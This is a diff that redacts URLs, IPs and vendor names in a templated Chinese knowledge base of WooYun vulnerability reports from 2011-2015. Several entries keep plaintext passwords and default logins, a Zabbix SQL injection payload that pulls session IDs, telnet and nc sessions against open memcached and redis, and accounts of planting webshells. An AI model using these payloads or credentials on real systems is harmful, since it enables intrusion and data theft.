 3. 验证漏洞响应
 
-**详情**: http://career.fengyunzhibo.com/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: *] 59.108.99.185:443 - Sending Heartbeat...[*] 59.108.99.185:443 - Heartbeat response, 46715 bytes[+] 59.108.99.185:443 - Heartbeat response with leak[*] 59.108.99.185:443 - Printable info leaked: 3TV'E8_L(+/329/5}auth.corp.ppweb.com.cn#3tspdy/3.1http/1.1uP^^$}yK&#< mFWE(3AU&Uoq*)&TO/TK@gi>3ospG~3th
+**POC**: *] [IP已脱敏] - Sending Heartbeat...[*] [IP已脱敏] - Heartbeat response, 46715 bytes[+] [IP已脱敏] - Heartbeat response with leak[*] [IP已脱敏] - Printable info leaked: 3TV'E8_L(+/329/5}auth.corp.ppweb.com.cn#3tspdy/3.1http/1.1uP^^$}yK&#< mFWE(3AU&Uoq*)&TO/TK@gi>3ospG~3th
 
 **绕过**: 直接利用
 
@@ -20622,7 +20622,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.gz12358.gov.cn/install/index.aspx 链接为该系统安装地址。
+**详情**: https://example.com/[已脱敏] 链接为该系统安装地址。
 
 **POC**: (见原文)
 
@@ -20644,9 +20644,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测漏地址：http://bugreport.yulong.com/泄漏太多，这里就点明几个：
+**详情**: 测漏地址：https://example.com/[已脱敏]
 
-**POC**: http://bugreport.yulong.com/phpsysinfo/index.php?disp=dynamichttp://bugreport.yulong.com/ElfLockScreen/sql/db_yl_elflockscreen.sqlhttp://bugreport.yulong.com/lockscreen/1.sqlhttp://bugreport.yulong.com/wwww/sql/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20666,7 +20666,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <db><dbcode>mynavi</dbcode><hostname>121.14.161.207</hostname><port>3309</port><username>aries</username><password>DLO![SBsf?GeBC33OP4y</password><database>mynav</database><save_queries>true</save_queries></db>
+**详情**: <db><dbcode>mynavi</dbcode><hostname>[IP已脱敏]</hostname><port>3309</port><username>aries</username><password>DLO![SBsf?GeBC33OP4y</password><database>mynav</database><save_queries>true</save_queries></db>
 
 **POC**: (见原文)
 
@@ -20676,8 +20676,8 @@
 ---
 
 ---
-### [wooyun-2014-086421] 京东JAE数据库读取任意系统文件
-**厂商**: 京东商城 | **年份**: 2014 | **类型**: 应用配置错误
+### [wooyun-2014-086421] 某电商平台JAE数据库读取任意系统文件
+**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -20710,7 +20710,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 12321网络不良与垃圾信息举报受理中心DNS域传送漏洞dnsenum 12321.cndnsenum.pl VERSION:1.2.3-----   12321.cn   -----Host's addresses:__________________12321.cn.                                5        IN    A        202.106.156.101Name Servers:______________ns3.cgw.cn.                              5        IN    A        211.166.253.239ns4.cgw.cn.                              5        IN    A        211.166.253.240Mail (
+**详情**: 12321网络不良与垃圾信息举报受理中心DNS域传送漏洞dnsenum 12321.cndnsenum.pl VERSION:1.2.3-----   12321.cn   -----Host's addresses:__________________12321.cn.                                5        IN    A        [IP已脱敏]Name Servers:______________ns3.cgw.cn.                              5        IN    A        [IP已脱敏]ns4.cgw.cn.                              5        IN    A        [IP已脱敏]Mail (
 
 **POC**: (见原文)
 
@@ -20732,9 +20732,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、访问http://222.66.10.72/kwms/WEB-INF/web.xml2、访问http://222.66.10.72/kwms//WEB-INF/applicationContext.xml可以遍历WEB-INF目录下面所有xml配置文件。
+**详情**: 1、访问http://[IP已脱敏]
 
-**POC**: http://222.66.10.72/kwms//WEB-INF/web.xmlhttp://222.66.10.72/kwms//WEB-INF/applicationContext.xml
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -20754,7 +20754,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tee.sports.sohu.com这个站http://www.yasabake.com旁站存在注射通过注射 注射出了ftp密码。登录ftp找到了目标站的后台找半天没找到数据然后发现了一个进去了……
+**详情**: https://example.com/[已脱敏] 注射出了ftp密码。登录ftp找到了目标站的后台找半天没找到数据然后发现了一个进去了……
 
 **POC**: (见原文)
 
@@ -20776,7 +20776,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国教育云服务平台主站Jboo服务配置不当导致服务器沦陷,系统权限。还是/jmx-console 和 /web-console 惹的祸。漏洞地址：http://189edu.cn/jmx-console/漏洞利用过程：还是熟悉的利用过程在框里插入我们的.war木马看看成功了没有插入war文件成功先看看什么权限，竟然是root权限，最大的权限了。下面是他的ip地址，根目录文件和用户
+**详情**: 中国教育云服务平台主站Jboo服务配置不当导致服务器沦陷,系统权限。还是/jmx-console 和 /web-console 惹的祸。漏洞地址：https://example.com/[已脱敏]
 
 **POC**: 漏洞证明
 
@@ -20798,13 +20798,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 认证后链接http://www.anquan.org/authenticate/cert/?site=www.cjk3d.net&at=personal改为http://www.anquan.org/authenticate/cert/?site=www.cjk3d.net&at=official可以看到具体的手机号用来社工等等也是极好的.http://www.baidu.com/s?ie=utf-8&wd=inurl%3Ahttp%3A%2F%2Fwww.anquan.org%2Fauthenticate%2Fcert%2F%3Fsite&tn=baiduhome_pg&oq=inurl%3Ahttp%3A%2F%2Fwww.anquan.org%2Fauthenticate%2Fcert%2F%3Fsite&rsv_spt=1&issp=1&rsv_bp=0&pn=0
+**详情**: 认证后链接https://example.com/[已脱敏]
 
-**POC**: 随便找一个http://www.anquan.org/authenticate/cert/?site=www.glsl.com.cn&at=personal改为http://www.anquan.org/authenticate/cert/?site=www.glsl.com.cn&at=official
+**POC**: 随便找一个https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 我不会..但是麻烦你们的个人站长认证,能不能增加QQ安全链接啊? 不然认证你个人站长做什么?
+**修复**: 我不会..但是麻烦你们的个人站长认证,能不能增加某互联网公司安全链接啊? 不然认证你个人站长做什么?
 ---
 
 ---
@@ -20820,9 +20820,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: VA虚拟应用管理平台：VA出色实现虚拟应用技术，提供稳定虚拟应用接入，致力于高性能、高安全性、细颗粒度的管理，采用各种先进技术丰富功能、改善用户体验。http://bcs.duapp.com/ehevaeaa/6.0.0.8037/VASetup_6.0.1.8037.exeEAA应用接入系统：EAA基于VA企业级引擎提供稳定安全的虚拟应用接入，致力于快速交付、快速应用和降低应用门槛，采用各种先进技术改善用户体验。http://bcs.duapp.com/ehevaeaa/6.0.0.8037/EAA_Setup_6.0.1.8037.exe以上两个应用安装后系统均建立一个“VA_admin”的管理员账号，官方放后门？而且把应用卸载后，这个账号仍然存在。。通过百度“VA虚拟应用管理平台”相关产品发现非凡软件站，太平洋下载中心，华军软件园，2345软件大全，均提供下载（这个在传播后门吗？）。
+**详情**: VA虚拟应用管理平台：VA出色实现虚拟应用技术，提供稳定虚拟应用接入，致力于高性能、高安全性、细颗粒度的管理，采用各种先进技术丰富功能、改善用户体验。https://example.com/[已脱敏]
 
-**POC**: WooYun: VA虚拟应用管理平台任意文件遍历案例参考上面漏洞提交的案例。（只要安装了这个产品，同时开启了3389就可以利用VA_admin登录，密码：Va5!123）http://115.239.168.50:82/http://219.132.130.113:88/http://58.250.163.30:88/http://103.25.65.51:88/http://123.232.112.146:82/http://61.187.6.149:81/http://124.114.153.30/http://121.15.212.2:5098/http://113.108.151.58
+**POC**: WooYun: VA虚拟应用管理平台任意文件遍历案例参考上面漏洞提交的案例。（只要安装了这个产品，同时开启了3389就可以利用VA_admin登录，密码：Va5!123）http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -20842,7 +20842,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://t1.lizhi.fm/http://t1.lizhi.fm/t1.php荔枝FM系统存在系统配置不当，导置可下载网站源码配置文件config_inc.php存在数据库和邮箱密码泄漏！
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20864,9 +20864,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 游戏谷：http://www.youxigu.com/www.youxigu.com.tar.gz
+**详情**: 游戏谷：https://example.com/[已脱敏]
 
-**POC**: 游戏谷：http://www.youxigu.com/www.youxigu.com.tar.gz
+**POC**: 游戏谷：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20886,7 +20886,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意中搜索搜到的：然后：地址：http://fzcz.chaozhou.gov.cn/测试是一台服务器：接着：再然后：
+**详情**: 无意中搜索搜到的：然后：地址：https://example.com/[已脱敏]
 
 **POC**: 拍屁股走人。。我什么都没干 拒绝跨省。
 
@@ -20908,9 +20908,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 贵州茅台酒股份有限公司某分站网站源代码泄露http://www.emaotai.cn/shop.zip
+**详情**: 贵州茅台酒股份有限公司某分站网站源代码泄露https://example.com/[已脱敏]
 
-**POC**: 网址:http://www.emaotai.cn/shop/整站源代码泄露
+**POC**: 网址:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20918,8 +20918,8 @@
 ---
 
 ---
-### [wooyun-2011-03840] 腾讯LOL商场后台登陆地址泄露
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-03840] 某互联网公司LOL商场后台登陆地址泄露
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -20952,7 +20952,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国科学院武汉病毒研究所“百人计划”简历提交系统http://159.226.126.50/SpecialTalentsInfo.Asp上传照片和证件的路径存在列目录http://159.226.126.50/wipmhrfilehttp://159.226.126.50/wipmhrpic/
+**详情**: 中国科学院武汉病毒研究所“百人计划”简历提交系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -20974,7 +20974,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 旗下站点：赶紧着问题一：1.数据库配置文件直接访问http://ganjinzhe.com//WEB-INF/database.properties2.获取数据库密码，mysql数据库端口外网开放。3.猜到nginx配置文件路径，mysql读取，可惜没有写权限。select load_file('/***打码****/nginx/conf/nginx.conf')
+**详情**: 旗下站点：赶紧着问题一：1.数据库配置文件直接访问https://example.com/[已脱敏] load_file('/***打码****/nginx/conf/nginx.conf')
 
 **POC**: 问题二：任意用户密码修改找回密码的时候邮箱随意输入出错，直接进入设置密码页。
 
@@ -21020,7 +21020,7 @@
 
 **详情**: ............
 
-**POC**: 江苏省食品生产企业动态监管系统一、目录遍历加注册企业信息泄露1、目录遍历 遍历处如下http://222.190.96.178:9995/2、注册企业用户名and密码泄露（明文密码）http://222.190.96.178:9995/User.aspx二、越权1、赋权网页http://222.190.96.178:9995/RelationUserTypePopedomManage.aspx2、权限管理页面3、P2监督检查录入4、不知道是什么的收件箱 里头一堆华丽丽的整改通知书三、任意文件上传并执行问题就出现在这个页面上http://222.190.96.178:9995/CheckInpu
+**POC**: 江苏省食品生产企业动态监管系统一、目录遍历加注册企业信息泄露1、目录遍历 遍历处如下http://[IP已脱敏] 里头一堆华丽丽的整改通知书三、任意文件上传并执行问题就出现在这个页面上http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -21040,7 +21040,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gkcf.dzwww.com/WEB-INF/web.xmlhttp://gkcf.dzwww.com/WEB-INF/applicationContext.xml 这个包含数据库信息
+**详情**: https://example.com/[已脱敏] 这个包含数据库信息
 
 **POC**: (见原文)
 
@@ -21084,7 +21084,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: root@kali:~# telnet 121.14.68.84 11211Trying 121.14.68.84...Connected to 121.14.68.84.Escape character is '^]'.stats itemsSTAT items:6:number 22434STAT items:6:age 16054249STAT items:6:evicted 0STAT items:6:outofmemory 0STAT items:7:number 59484STAT items:7:age 16054241STAT items:7:evicted 0STAT items:7:outofmemory 0STAT items:8:number 144649STAT items:8:age 16054241STAT items:8:evicted 0STAT item
+**详情**: root@kali:~# telnet [IP已脱敏] 11211Trying [IP已脱敏]...Connected to [IP已脱敏].Escape character is '^]'.stats itemsSTAT items:6:number 22434STAT items:6:age 16054249STAT items:6:evicted 0STAT items:6:outofmemory 0STAT items:7:number 59484STAT items:7:age 16054241STAT items:7:evicted 0STAT items:7:outofmemory 0STAT items:8:number 144649STAT items:8:age 16054241STAT items:8:evicted 0STAT item
 
 **POC**: (见原文)
 
@@ -21106,7 +21106,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可查看目录，及日志，但影响不是很大http://bu.uc.cn/logs/http://bu.uc.cn/public/浏览器有时打不开显示403,多刷新几次就可以打开了上图吧
+**详情**: 可查看目录，及日志，但影响不是很大https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -21128,13 +21128,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ip:117.79.131.116 句酷搜索117.79.131.100 句酷批改117.79.131.105100和105 目测新添加的，还没有什么信息。
+**详情**: ip:[IP已脱敏] 句酷搜索117.79.131.100 句酷批改117.79.131.105100和105 目测新添加的，还没有什么信息。
 
-**POC**: # nc -vv 117.79.131.116 11211Connection to 117.79.131.116 11211 port [tcp/*] succeeded!stats itemsSTAT items:1:number 1120010STAT items:1:age 1986081STAT items:1:evicted 5218687STAT items:1:outofmemory 0STAT items:2:number 18724STAT items:2:age 2981862STAT items:2:evicted 55065STAT items:2:outofmemo
+**POC**: # nc -vv [IP已脱敏] 11211Connection to [IP已脱敏] 11211 port [tcp/*] succeeded!stats itemsSTAT items:1:number 1120010STAT items:1:age 1986081STAT items:1:evicted 5218687STAT items:1:outofmemory 0STAT items:2:number 18724STAT items:2:age 2981862STAT items:2:evicted 55065STAT items:2:outofmemo
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/papers/865
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -21150,9 +21150,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 出异常，取NULL空值用户http://cu.ruiyinxin.com/cspLoginAction.passwordRetrieve.c?&operType=2&merchId=ODg2MzcxMzU3MjIzMjY4&answer=MA==&newPassword=YWExMjM0NTY=&settleDate=MjAxNTA1MDI=&encry=true访问一次然后去掉cspLoginAction.passwordRetrieve.c?&operType=2&merchId=ODg2MzcxMzU3MjIzMjY4&answer=MA==&newPassword=YWExMjM0NTY=&settleDate=MjAxNTA1MDI=&encry=true直接访问：http://cu.ruiyinxin.com直接以空值用户登录DB2 SQL Error: SQLCODE=-20
+**详情**: 出异常，取NULL空值用户https://example.com/[已脱敏] SQL Error: SQLCODE=-20
 
-**POC**: 访问：http://cu.ruiyinxin.com/cspLoginAction.passwordRetrieve.c?&operType=2&merchId=ODg2MzcxMzU3MjIzMjY4&answer=MA==&newPassword=YWExMjM0NTY=&settleDate=MjAxNTA1MDI=&encry=true出异常退回：访问即可http://cu.ruiyinxin.com
+**POC**: 访问：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -21218,7 +21218,7 @@
 
 **详情**: 凤凰网诗歌录入系统后台泄漏，可更改添加内容！
 
-**POC**: <img src="http://app.book.ifeng.com/poem/index.php?_c=admin&_a=create&type=poet" />
+**POC**: <img src="https://example.com/[已脱敏]" />
 
 **绕过**: 直接利用
 
@@ -21226,8 +21226,8 @@
 ---
 
 ---
-### [wooyun-2013-040990] 天猫商城某400 Bad Request页可劫持cookies
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 应用配置错误
+### [wooyun-2013-040990] 某电商平台商城某400 Bad Request页可劫持cookies
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -21260,7 +21260,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一处：http://www.sarft.gov.cn//WEB-INF/web.xml这个目录也能访问么？？？第二处：http://dsj.sarft.gov.cn//invoker/JMXInvokerServletJBoss HttpAdaptor JMXInvokerServletJBoss的文件，谁要反汇编一下，那结果DUANG~~~
+**详情**: 第一处：https://example.com/[已脱敏] HttpAdaptor JMXInvokerServletJBoss的文件，谁要反汇编一下，那结果DUANG~~~
 
 **POC**: (见原文)
 
@@ -21288,7 +21288,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 百度一下方法应该很多
+**修复**: 某搜索引擎一下方法应该很多
 ---
 
 ---
@@ -21306,11 +21306,11 @@
 
 **详情**: 1、sendmail重定向传送、sendmail 服务器接受邮件以'user@host1@example.com'格式发送到收件人，利用该命令来达到在防火墙后面的邮件服务器，为了避免由通过受影响的主机路由邮件的检测。2、未登录也能发邮件、可使用任意@miibeian.gov.cn后缀的邮箱地址发送邮件。
 
-**POC**: 工信部的邮箱服务器好像有两台，但其实就mail1.miibeian.gov.cn在用吧。mail.miibeian.gov.cn 25  219.143.225.39mail1.miibeian.gov.cn 25 219.143.225.38欢迎使用 Microsoft Telnet ClientEscape 字符为 'CTRL+]'Microsoft Telnet> set localecho本地回显启用Microsoft Telnet> set logfile neuron.txt日志文件: neuron.txt客户端登录Microsoft Telnet> open mail1.miib
+**POC**: 工信部的邮箱服务器好像有两台，但其实就mail1.miibeian.gov.cn在用吧。mail.miibeian.gov.cn 25  [IP已脱敏]mail1.miibeian.gov.cn 25 [IP已脱敏]欢迎使用 Microsoft Telnet ClientEscape 字符为 'CTRL+]'Microsoft Telnet> set localecho本地回显启用Microsoft Telnet> set logfile neuron.txt日志文件: neuron.txt客户端登录Microsoft Telnet> open mail1.miib
 
 **绕过**: 直接利用
 
-**修复**: 本来想告诉你们的，但是http://www.miitbeian.gov.cn/getVerifyCode?82 你们这破验证码，怎么输都是错，错错……    NEURON最牜庇。
+**修复**: 本来想告诉你们的，但是https://example.com/[已脱敏] 你们这破验证码，怎么输都是错，错错……    NEURON最牜庇。
 ---
 
 ---
@@ -21326,7 +21326,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://club.voicecloud.cn/static/image/common/logo.png/.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21348,9 +21348,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.http://tvs.tcl.com/admin/admin.rar可直接下载源代码2.配置不当，导致目录浏览，存在源码压缩包，可下载http://smarthome.tcl.com/manager/3.还有sa账号密码
+**详情**: 1.https://example.com/[已脱敏]
 
-**POC**: 1.http://tvs.tcl.com/admin/admin.rar可直接下载源代码2.配置不当，导致目录浏览，存在源码压缩包，可下载http://smarthome.tcl.com/manager/3.还有sa账号密码
+**POC**: 1.https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -21438,7 +21438,7 @@
 
 **详情**: 案例某省扫描结果mask 区域*****^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********^^频监^**********0视频^*****默认账户和密码为admin/1111
 
-**POC**: 百度搜索结果登陆**.**.**.**:7000视频监控平台，为辉南县教育局，该地所有学校监控摄像头**.**.**.**:7000视频监控平台 洮北区**.**.**.**:7000视频监控平台 敦化数十个地区**.**.**.**:7000视频监控平台 柳河县就证明这些吧
+**POC**: 某搜索引擎搜索结果登陆**.**.**.**:7000视频监控平台，为辉南县教育局，该地所有学校监控摄像头**.**.**.**:7000视频监控平台 洮北区**.**.**.**:7000视频监控平台 敦化数十个地区**.**.**.**:7000视频监控平台 柳河县就证明这些吧
 
 **绕过**: 直接利用
 
@@ -21468,8 +21468,8 @@
 ---
 
 ---
-### [wooyun-2014-074668] 中国移动MAS代理服务器存在MYSQL用户名口令
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-074668] 某运营商MAS代理服务器存在MYSQL用户名口令
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -21480,7 +21480,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登陆IP：218.205.243.122:80直接复制上一个漏洞的，哈哈，原谅我懒惰！！！通过猜解出MYSQL(数据库用户为root,密码是12345678)密码后，用nmap得知80为web登陆端口，这次移动更彻底，端口都没改，哎一进来我就看到这熟悉的界面果断登陆。于是用得到登陆用户名（admin）和密码(123456789)，可以对mas短信服务和wap服务进行修改，这次好像还多了一个工资发送- -。嘿嘿。导致移动服务瘫痪，导致后果极其严重。继续默默挖洞去
+**详情**: 登陆IP：[IP已脱敏]直接复制上一个漏洞的，哈哈，原谅我懒惰！！！通过猜解出MYSQL(数据库用户为root,密码是12345678)密码后，用nmap得知80为web登陆端口，这次移动更彻底，端口都没改，哎一进来我就看到这熟悉的界面果断登陆。于是用得到登陆用户名（admin）和密码(123456789)，可以对mas短信服务和wap服务进行修改，这次好像还多了一个工资发送- -。嘿嘿。导致移动服务瘫痪，导致后果极其严重。继续默默挖洞去
 
 **POC**: (见原文)
 
@@ -21502,7 +21502,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不正确的redis配置导致安全问题，上百万数据量。。。我都不敢遍历，怕卡死= =、、、所以只获取了一条相关key来证明此漏洞的存在！qiufeng@ubuntu:/tmp$ telnet 118.144.80.201 6379Trying 118.144.80.201...Connected to 118.144.80.201.Escape character is '^]'.dbsize:1309186get PHPREDIS_SESSION:htioc1de81mpn186enogjmp2o7$204authorize_de7a9b5fe485f540e67361b7507c98d5|a:3:{s:6:"action";s:5:"login";s:7:"referer";s:23:"http://dev.duoshuo.com/";s:3:"sso";i:0;}login_refere
+**详情**: 不正确的redis配置导致安全问题，上百万数据量。。。我都不敢遍历，怕卡死= =、、、所以只获取了一条相关key来证明此漏洞的存在！qiufeng@ubuntu:/tmp$ telnet [IP已脱敏] 6379Trying [IP已脱敏]...Connected to [IP已脱敏].Escape character is '^]'.dbsize:1309186get PHPREDIS_SESSION:htioc1de81mpn186enogjmp2o7$204authorize_de7a9b5fe485f540e67361b7507c98d5|a:3:{s:6:"action";s:5:"login";s:7:"referer";s:23:"https://example.com/[已脱敏]";s:3:"sso";i:0;}login_refere
 
 **POC**: (见原文)
 
@@ -21524,7 +21524,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 徐州市教育系统IP：222.187.96.1-255，全部49个存活网站中有11个存在IIS PUT漏洞，多于1/5啊。。。以IP：222.187.96.85为例，此网站为徐州市教育局电子政务系统网站
+**详情**: 徐州市教育系统IP：[IP已脱敏]-255，全部49个存活网站中有11个存在IIS PUT漏洞，多于1/5啊。。。以IP：[IP已脱敏]为例，此网站为徐州市教育局电子政务系统网站
 
 **POC**: IIS PUT Scanner扫描结果：写入Webshell，菜刀连接成功:数据库配置文件，得到用户名密码：好多数据。。得到Web系统管理员密码：（PS：真不明白这当初的程序员怎么想的。。明明把密码MD5了，非得再存份明文的密码。。拉出去枪毙都不多！！）进入系统：
 
@@ -21546,7 +21546,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 订单系统沦陷http://dingdan.fday.co/  【打包这个地址http://dingdan.fday.xyz/】libo  fday2015哎...
+**详情**: 订单系统沦陷https://example.com/[已脱敏]  【打包这个地址https://example.com/[已脱敏]  fday2015哎...
 
 **POC**: ···
 
@@ -21568,9 +21568,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关键字：openEAP_统一登录门户 url：/security/authenopenEAP企业应用平台—配置管理 url：/security/login?module=eapadminxxx客服中心  url: /agent/eaptag2 home  url:eaptag2/pages/examples/demo/index.html还有一些谷歌不到的，难道我姿势不够。湖南电信http://gj.hn118114.cn   222.240.139.227海南电信http://59.50.113.197:1680陕西联通http://123.139.154.42:9080/康佳61.191.235.163中国电信219.159.76.60:9080广东电信http://58.63.38.180:9080
+**详情**: 关键字：openEAP_统一登录门户 url：/security/authenopenEAP企业应用平台—配置管理 url：/security/login?module=eapadminxxx客服中心  url: /agent/eaptag2 home  url:eaptag2/pages/examples/demo/index.html还有一些谷歌不到的，难道我姿势不够。湖南电信https://example.com/[已脱敏]   [IP已脱敏]海南电信http://[IP已脱敏]陕西联通http://[IP已脱敏]
 
-**POC**: 默认界面是这样的后台路径是http://dns.suntektech.com//eapmgr默认口令manager/suntek后台带部署应用功能直接shell撸下官网，root权限貌似内网大有做为呀
+**POC**: 默认界面是这样的后台路径是https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -21590,7 +21590,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.sogou.com/favicon/系统配置不当，导致可以浏览任意文件喔
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21600,8 +21600,8 @@
 ---
 
 ---
-### [wooyun-2014-073689] 远程猜测出中国移动MAS代理服务器存在MYSQL用户名口令
-**厂商**: 218.200.202.105 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-073689] 远程猜测出某运营商MAS代理服务器存在MYSQL用户名口令
+**厂商**: [IP已脱敏] | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -21634,7 +21634,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 四星idc运营商国旭网络# DNS域传送漏洞一枚C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> guoxuwang.cnServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:guoxuwang.cn    nameserver = ns1.guoxuwang.comguoxuwang.cn    nameserver = ns2.guoxuwang.com> server ns2.guoxuwang.comDefault Server:  ns2.guoxuwang.comAddr
+**详情**: 四星idc运营商国旭网络# DNS域传送漏洞一枚C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> guoxuwang.cnServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:guoxuwang.cn    nameserver = ns1.guoxuwang.comguoxuwang.cn    nameserver = ns2.guoxuwang.com> server ns2.guoxuwang.comDefault Server:  ns2.guoxuwang.comAddr
 
 **POC**: (见原文)
 
@@ -21656,9 +21656,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在被黑统计看到的，已经被人拿下。put--yes测试页面：http://www.hrbgs.gov.cn/lck.txt貌似有狗，小菜突破不了，不过总有可以突破的人，修复一下吧@疯狗 话说我有两个7月2日提交的漏洞都没审
+**详情**: 在被黑统计看到的，已经被人拿下。put--yes测试页面：https://example.com/[已脱敏] 话说我有两个7月2日提交的漏洞都没审
 
-**POC**: http://www.hrbgs.gov.cn/lck.txt很多人来过http://www.hrbgs.gov.cn/alert.txthttp://www.hrbgs.gov.cn/index.htmlhttp://www.hrbgs.gov.cn/login.html一个政府站被插成这样。。。修复吧
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -21700,7 +21700,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.psbc.com/portal/zh_CNhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/File/PSBC-Mobile/login/login.html到最后不敢点确定那……冒汗……
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21722,13 +21722,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IP地址：183.57.81.246随便找了个表数据量都是上G的。多玩服务器证明，几乎所有的表里面都有duowan、yy的IP记录。多玩的数据记录。yy的数据记录。数据绝对海量，绝对生产环境，可否给个礼物。
+**详情**: IP地址：[IP已脱敏]随便找了个表数据量都是上G的。多玩服务器证明，几乎所有的表里面都有duowan、yy的IP记录。多玩的数据记录。yy的数据记录。数据绝对海量，绝对生产环境，可否给个礼物。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -21744,7 +21744,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题存在于http://q.yoger.com.cn/存在列目录漏洞发现用户数据登录某个优个网内部用户
+**详情**: 问题存在于https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -21768,7 +21768,7 @@
 
 **详情**: 问题1shop.baofeng.com git源码重构经过审计发现注入一枚用户库以及vip支付库配置
 
-**POC**: 问题2http://114.112.82.52/zabbix/httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables grou
+**POC**: 问题2http://[IP已脱敏] and (select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables grou
 
 **绕过**: 直接利用
